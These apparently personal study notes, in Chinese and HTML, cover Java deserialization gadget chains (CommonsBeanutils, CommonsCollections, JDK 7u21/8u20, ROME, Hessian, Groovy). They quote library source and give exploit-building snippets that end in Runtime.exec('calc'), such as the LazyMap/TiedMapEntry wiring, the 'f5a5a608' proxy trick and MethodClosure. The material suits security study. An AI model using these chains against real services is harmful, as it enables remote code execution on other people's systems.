<h3 id="shiro依赖-自带的CB-tomcat应用下可能有CC"><a href="#shiro依赖-自带的CB-tomcat应用下可能有CC" class="headerlink" title="shiro依赖 自带的CB  tomcat应用下可能有CC"></a>shiro依赖 自带的CB  tomcat应用下可能有CC</h3><h5 id="BeanComparator-后可compare-调到-invoketransform-transform-》-rce-templateimpl"><a href="#BeanComparator-后可compare-调到-invoketransform-transform-》-rce-templateimpl" class="headerlink" title="BeanComparator  后可compare 调到 invoketransform.transform -》 rce | templateimpl"></a>BeanComparator  后可compare 调到 invoketransform.transform -》 rce | templateimpl</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">public class BeanComparator implements Comparator, Serializable &#123;</span><br><span class="line">    private String property;</span><br><span class="line">    private Comparator comparator;</span><br><span class="line"></span><br><span class="line">    public BeanComparator() &#123;  // 构造方法1</span><br><span class="line">        this( null );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public BeanComparator( String property ) &#123;  // 构造方法2</span><br><span class="line">        this( property, ComparableComparator.getInstance() );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public BeanComparator( String property, Comparator comparator ) &#123; // 构造方法3    这里传入的comparator可以是Comparator的继承类。这个特性需要复习</span><br><span class="line">        setProperty( property );</span><br><span class="line">        if (comparator != null) &#123;</span><br><span class="line">            this.comparator = comparator;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，想要不使用ComparableComparator这个类，必须在构造方法3处给入comparator参数，由于comparator必须存在，但具体什么类型并不影响后面的调用链，所以给进去的这个类要满足三个条件即可：</p>
<p>实现java.util.Comparator接口<br>实现java.io.Serializable接口<br>Java、shiro或commons-beanutils自带，且兼容性强<br>这里直接用一下大佬给出的两个类：</p>
<p>String.CASE_INSENSITIVE_ORDER获取运行环境中的CaseInsensitiveComparator类<br>java.util.Collections$ReverseComparator</p>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Hashtable-原生类-equal-调-AbstractMap-equals-调lazymap-get-这里有点绕-照着7的链子改"><a href="#Hashtable-原生类-equal-调-AbstractMap-equals-调lazymap-get-这里有点绕-照着7的链子改" class="headerlink" title="Hashtable  原生类   equal 调 AbstractMap.equals 调lazymap.get()   这里有点绕 照着7的链子改"></a>Hashtable  原生类   equal 调 AbstractMap.equals 调lazymap.get()   这里有点绕 照着7的链子改</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//Hashtable 的 readObject 方法</span><br><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">         throws IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">       ………………</span><br><span class="line">        for (; elements &gt; 0; elements--) &#123;</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line"></span><br><span class="line">            //reconstitutionPut方法</span><br><span class="line">            reconstitutionPut(newTable, key, value);</span><br><span class="line">        &#125;</span><br><span class="line">        this.table = newTable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//跟进 reconstitutionPut 方法</span><br><span class="line">    private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value)</span><br><span class="line">        throws StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        if (value == null) &#123;</span><br><span class="line">            throw new java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        int hash = hash(key);</span><br><span class="line">        int index = (hash &amp; 0x7FFFFFFF) % tab.length;</span><br><span class="line">        for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123;</span><br><span class="line"></span><br><span class="line">            //注意这里的 equals 方法</span><br><span class="line">            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">                throw new java.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // Creates the new entry.</span><br><span class="line">        Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">        tab[index] = new Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>跟进上面的 equals 方法，发现最终调用了 AbstractMap 类的 equals 方法，如下：</p>
<h3 id="LinkedHashSet-HashSet原生类-source-动态代理-任意方法get-7u21-8u20"><a href="#LinkedHashSet-HashSet原生类-source-动态代理-任意方法get-7u21-8u20" class="headerlink" title="(LinkedHashSet)HashSet原生类  source-&gt;动态代理-&gt;任意方法get  7u21|8u20"></a>(LinkedHashSet)HashSet原生类  source-&gt;动态代理-&gt;任意方法get  7u21|8u20</h3><h5 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in any hidden serialization magic</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Read in HashMap capacity and load factor and create backing HashMap</span><br><span class="line">    int capacity = s.readInt();</span><br><span class="line">    float loadFactor = s.readFloat();</span><br><span class="line">    map = (((HashSet)this) instanceof LinkedHashSet ?</span><br><span class="line">           new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           new HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    // Read in size</span><br><span class="line">    int size = s.readInt();</span><br><span class="line"></span><br><span class="line">    // Read in all elements in the proper order.</span><br><span class="line">    for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">        E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);   // 重点在这里 跟进put方法</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    if (key == null)</span><br><span class="line">        return putForNullKey(value);</span><br><span class="line">    int hash = hash(key);</span><br><span class="line">    int i = indexFor(hash, table.length);</span><br><span class="line">    for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;</span><br><span class="line">        Object k;</span><br><span class="line">        if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;   //key.equals(k)，如果让k是代理对象，k是我们的恶意TemplatesImpl的话，就可以和上面的分析接上了，成功命令执行。</span><br><span class="line">        //后面太精妙了 具体看https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DJDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%AD%A6%E4%B9%A0.md</span><br><span class="line">        //他想到让memberValues这个Map只有一个键值对，让key的hash为0，这样127*0=0，然后0^xxx仍然是xxx（相同为0，不同为1）。再让value是恶意的TemplatesImpl对象，这样计算的就是那个TemplatesImpl对象的hash值，自然就相同了。tttttql。至于hash为0的键，找到的是f5a5a608。</span><br><span class="line">        ......</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>修复方案：<br> innotationInvocationHandler在readObject时会检查this.type，而这里为了控制type一定会报错</p>
<p>修复前在只是把函数return，但由于已经defaultReadObject，对反序列化流程没有影响。而修复后后直接丢异常。</p>
<h5 id="8u20-LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。"><a href="#8u20-LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。" class="headerlink" title="8u20  LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。"></a>8u20  LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</h5><p>1.反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是会抛弃掉这个成员。</p>
<p>2.每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用TC_REFERENCE结构,引用前面handle的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
<p>8中的修复方式相对更治标一些:</p>
<p>使用 readFields 替换了之前的 defaultReadObject ，这样一来就没有可以引用的东西了，8u20 自然无从谈起。</p>
<h4 id="那么这个类想利用的话就"><a href="#那么这个类想利用的话就" class="headerlink" title="那么这个类想利用的话就"></a>那么这个类想利用的话就</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, Object&gt; memberValues = new HashMap&lt;String, Object&gt;();</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,&quot;feng&quot;);</span><br><span class="line">Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">Constructor cons = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">cons.setAccessible(true);</span><br><span class="line">InvocationHandler handler = (InvocationHandler)cons.newInstance(Templates.class, memberValues);</span><br><span class="line">HashSet hashSet = new LinkedHashSet();</span><br><span class="line">hashSet.add(templates);  //templates 是上面的对象</span><br><span class="line">Templates proxy = (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),new Class[]&#123;Templates.class&#125;,handler);</span><br><span class="line">hashSet.add(proxy);</span><br><span class="line">memberValues.put(&quot;f5a5a608&quot;,templates);</span><br></pre></td></tr></table></figure>
<h3 id="TiedMapEntry-原生类-前-BadAttributeValueExpException-toString-HashMap-hashCode-后-TiedMapEntry-toString-hashCode-可触发-LazyMap-get"><a href="#TiedMapEntry-原生类-前-BadAttributeValueExpException-toString-HashMap-hashCode-后-TiedMapEntry-toString-hashCode-可触发-LazyMap-get" class="headerlink" title="TiedMapEntry 原生类  前 BadAttributeValueExpException-&gt;toString   HashMap-&gt;hashCode()后    TiedMapEntry.toString()|hashCode()  可触发 LazyMap.get()"></a>TiedMapEntry 原生类  前 BadAttributeValueExpException-&gt;toString   HashMap-&gt;hashCode()后    TiedMapEntry.toString()|hashCode()  可触发 LazyMap.get()</h3><h4 id="tostring-后-get"><a href="#tostring-后-get" class="headerlink" title="tostring   后 get()"></a>tostring   后 get()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Entry, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = -8453869361373831205L;</span><br><span class="line">    private final Map map;</span><br><span class="line">    private final Object key;</span><br><span class="line"></span><br><span class="line">    //构造函数，显然我们可以控制 this.map 为 LazyMap</span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">        this.map = map;</span><br><span class="line">        this.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //toString函数，注意这里调用了 getValue()</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return this.getKey() + &quot;=&quot; + this.getValue();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br><span class="line">    public Object getValue() &#123;</span><br><span class="line">        return this.map.get(this.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h4 id="hashcode-后-get"><a href="#hashcode-后-get" class="headerlink" title="hashcode() 后 get()"></a>hashcode() 后 get()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">public class TiedMapEntry implements Entry, KeyValue, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = -8453869361373831205L;</span><br><span class="line">    private final Map map;</span><br><span class="line">    private final Object key;</span><br><span class="line"></span><br><span class="line">    //构造函数，显然我们可以控制 this.map 为 LazyMap</span><br><span class="line">    public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">        this.map = map;</span><br><span class="line">        this.key = key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //hashCode函数，注意这里调用了 getValue()</span><br><span class="line">    public int hashCode() &#123;</span><br><span class="line">        Object value = this.getValue();</span><br><span class="line">        return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get()</span><br><span class="line">    public Object getValue() &#123;</span><br><span class="line">        return this.map.get(this.key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>利用衔接还是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;test&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="原生类-HashMap-后可调-hashcode"><a href="#原生类-HashMap-后可调-hashcode" class="headerlink" title="原生类 HashMap  后可调 hashcode()"></a>原生类 HashMap  后可调 hashcode()</h3><p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap = new HashMap();</span><br><span class="line">hashMap.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//通过反射设置真的 transformer 数组</span><br><span class="line">Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);</span><br><span class="line">field.setAccessible(true);</span><br><span class="line">field.set(chainedTransformer, transformers);</span><br><span class="line">//清空由于 hashMap.put 对 LazyMap 造成的影响</span><br><span class="line">lazyMap.clear();</span><br></pre></td></tr></table></figure>

<h3 id="原生类-BadAttributeValueExpException-后-tostring"><a href="#原生类-BadAttributeValueExpException-后-tostring" class="headerlink" title="原生类 BadAttributeValueExpException  后 tostring()"></a>原生类 BadAttributeValueExpException  后 tostring()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class BadAttributeValueExpException extends Exception   &#123;</span><br><span class="line">    private Object val;     //这里可以控制 val 为 TiedMapEntry</span><br><span class="line"></span><br><span class="line">    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream.GetField gf = ois.readFields();</span><br><span class="line">        Object valObj = gf.get(&quot;val&quot;, null);</span><br><span class="line"></span><br><span class="line">        if (valObj == null) &#123;</span><br><span class="line">            val = null;</span><br><span class="line">        &#125; else if (valObj instanceof String) &#123;</span><br><span class="line">            val= valObj;</span><br><span class="line">        &#125; else if (System.getSecurityManager() == null</span><br><span class="line">                || valObj instanceof Long</span><br><span class="line">                || valObj instanceof Integer</span><br><span class="line">                || valObj instanceof Float</span><br><span class="line">                || valObj instanceof Double</span><br><span class="line">                || valObj instanceof Byte</span><br><span class="line">                || valObj instanceof Short</span><br><span class="line">                || valObj instanceof Boolean) &#123;</span><br><span class="line">            val = valObj.toString();    //这里是关键点，调用toString()</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            val = System.identityHashCode(valObj) + &quot;@&quot; + valObj.getClass().getName();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//BadAttributeValueExpException 实例</span><br><span class="line">BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);</span><br><span class="line"></span><br><span class="line">//反射设置 val</span><br><span class="line">Field val = BadAttributeValueExpException.class.getDeclaredField(&quot;val&quot;);</span><br><span class="line">val.setAccessible(true);</span><br><span class="line">val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line">//当反序列化时，会自动badAttributeValueExpException.toString</span><br></pre></td></tr></table></figure>
<h3 id="Hessian-作为链的source点-后跟-HashMap-put-而hashMap-put后面可跟其他链"><a href="#Hessian-作为链的source点-后跟-HashMap-put-而hashMap-put后面可跟其他链" class="headerlink" title="Hessian    作为链的source点  后跟 HashMap.put 而hashMap.put后面可跟其他链"></a>Hessian    作为链的source点  后跟 HashMap.put 而hashMap.put后面可跟其他链</h3><p>Hessian  是一个rpc框架<br>HashMap.put()<br>MapDeserializer.readMap()<br>SerializerFactory.readMap()<br>Hessian2Input.readObject()<br>可以看出</p>
<h4 id="配合ROME"><a href="#配合ROME" class="headerlink" title="配合ROME"></a>配合ROME</h4><h5 id="配合Spring-PartiallyComparableAdvisorHolder链"><a href="#配合Spring-PartiallyComparableAdvisorHolder链" class="headerlink" title="配合Spring PartiallyComparableAdvisorHolder链"></a>配合Spring PartiallyComparableAdvisorHolder链</h5><h5 id="配合Spring-AbstractBeanFactoryPointcutAdvisor链"><a href="#配合Spring-AbstractBeanFactoryPointcutAdvisor链" class="headerlink" title="配合Spring AbstractBeanFactoryPointcutAdvisor链"></a>配合Spring AbstractBeanFactoryPointcutAdvisor链</h5><h5 id="配合Resin链"><a href="#配合Resin链" class="headerlink" title="配合Resin链"></a>配合Resin链</h5><h5 id="配合XBean链"><a href="#配合XBean链" class="headerlink" title="配合XBean链"></a>配合XBean链</h5><h3 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h3><h5 id="前-HashMap-hash-HashTable-reconstitutionPut-BadAttributeValueExpExcepti——-EqualsBean"><a href="#前-HashMap-hash-HashTable-reconstitutionPut-BadAttributeValueExpExcepti——-EqualsBean" class="headerlink" title="前 HashMap.hash|HashTable.reconstitutionPut|BadAttributeValueExpExcepti——&gt;EqualsBean |"></a>前 HashMap.hash|HashTable.reconstitutionPut|BadAttributeValueExpExcepti——&gt;EqualsBean |</h5><h6 id="前-有AOC时-HotSwappableTargetSource-ToStringBean-toString《—-XString-equals-《—HotSwappableTargetSource-equals"><a href="#前-有AOC时-HotSwappableTargetSource-ToStringBean-toString《—-XString-equals-《—HotSwappableTargetSource-equals" class="headerlink" title="前   有AOC时 HotSwappableTargetSource  ToStringBean.toString《—-XString.equals()《—HotSwappableTargetSource.equals()"></a>前   有AOC时 HotSwappableTargetSource  ToStringBean.toString《—-XString.equals()《—HotSwappableTargetSource.equals()</h6><h6 id="后-ToStringBean-toString—–-TemplatesImpl-getOutputProperties-。"><a href="#后-ToStringBean-toString—–-TemplatesImpl-getOutputProperties-。" class="headerlink" title="后 ToStringBean.toString—–&gt;TemplatesImpl.getOutputProperties()   。"></a>后 ToStringBean.toString—–&gt;TemplatesImpl.getOutputProperties()   。</h6><h6 id="后-有-JDBCRowset-ToStringBean-toString-JdbcRowSetImpl-getDatabaseMetaData"><a href="#后-有-JDBCRowset-ToStringBean-toString-JdbcRowSetImpl-getDatabaseMetaData" class="headerlink" title="后  有 JDBCRowset   ToStringBean.toString-&gt;JdbcRowSetImpl.getDatabaseMetaData()"></a>后  有 JDBCRowset   ToStringBean.toString-&gt;JdbcRowSetImpl.getDatabaseMetaData()</h6><h5 id="AbstractMap-EqualsBean-TemplatesImpl"><a href="#AbstractMap-EqualsBean-TemplatesImpl" class="headerlink" title="AbstractMap-&gt;EqualsBean-&gt;TemplatesImpl"></a>AbstractMap-&gt;EqualsBean-&gt;TemplatesImpl</h5><h3 id="LazyMap原生类-后-transform-即CC-前-AnnotationInvocationHandler-TiedMapEntry"><a href="#LazyMap原生类-后-transform-即CC-前-AnnotationInvocationHandler-TiedMapEntry" class="headerlink" title="LazyMap原生类  后 transform() 即CC  前  AnnotationInvocationHandler|TiedMapEntry"></a>LazyMap原生类  后 transform() 即CC  前  AnnotationInvocationHandler|TiedMapEntry</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123;</span><br><span class="line">    private static final long serialVersionUID = 7990956402564206740L;</span><br><span class="line">    protected final Transformer factory;</span><br><span class="line"></span><br><span class="line">    //可控制 factory 为 ChainedTransformer</span><br><span class="line">    public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="line">        return new LazyMap(map, factory);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected LazyMap(Map map, Transformer factory) &#123;</span><br><span class="line">        super(map);</span><br><span class="line">        if (factory == null) &#123;</span><br><span class="line">            throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            this.factory = factory;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //利用 get 方法可实现调用 ChainedTransformer#transform()</span><br><span class="line">    public Object get(Object key) &#123;</span><br><span class="line">        if (!super.map.containsKey(key)) &#123;</span><br><span class="line">            //关键点</span><br><span class="line">            Object value = this.factory.transform(key);</span><br><span class="line">            super.map.put(key, value);</span><br><span class="line">            return value;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return super.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="get-方法-后-transform-前-AnnotationInvocationHandler"><a href="#get-方法-后-transform-前-AnnotationInvocationHandler" class="headerlink" title="get()方法   后  transform()  前 AnnotationInvocationHandler"></a>get()方法   后  transform()  前 AnnotationInvocationHandler</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Map uselessMap = new HashMap();     # LazyMap.decorate()用于转对象类型。</span><br><span class="line">//这里有一点坑 map.put(&quot;value&quot;,&quot;gxngxngxn&quot;);   </span><br><span class="line">uselessMap.put(&quot;value&quot;,&quot;gxngxngxn&quot;); </span><br><span class="line">Map lazyMap = LazyMap.decorate(uselessMap, chainedTransformer);   # 这里chainedTransformer从上面找</span><br><span class="line">lazyMap.get(&quot;test&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><h4 id="MethodClosure"><a href="#MethodClosure" class="headerlink" title="MethodClosure"></a>MethodClosure</h4><p>构造方法接收两个参数，一个是对象，一个是对象的方法名，这个类有一个doCall方法传入一个参数，通过InvokerHelper.invokeMethod调用方法，但是这个方法是private私有属性，我们不能直接调用，我们可以通过反射调用doCall</p>
<pre><code>  MethodClosure exec = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);
    Method doCall = MethodClosure.class.getDeclaredMethod(&quot;doCall&quot;, Object.class);
    doCall.setAccessible(true);
    doCall.invoke(exec, &quot;calc&quot;);
</code></pre>
<h4 id="String-execute"><a href="#String-execute" class="headerlink" title="String.execute()"></a>String.execute()</h4><pre><code>MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
methodClosure.call();
</code></pre>
<h4 id="ConvertedClosure"><a href="#ConvertedClosure" class="headerlink" title="ConvertedClosure"></a>ConvertedClosure</h4><p>用于将闭包适配到 Java 接口，他继承了ConversionHandler，而ConversionHandler又实现了InvocationHandler接口，所以这就是一个动态代理类</p>
<h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><pre><code>    MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);
    ConvertedClosure convertedClosure = new ConvertedClosure(methodClosure, &quot;entrySet&quot;);
    //反射获取AnnotationInvocationHandler构造方法
    Class&lt;?&gt; aClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
    Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructors()[0];
    constructor.setAccessible(true);
    //动态代理
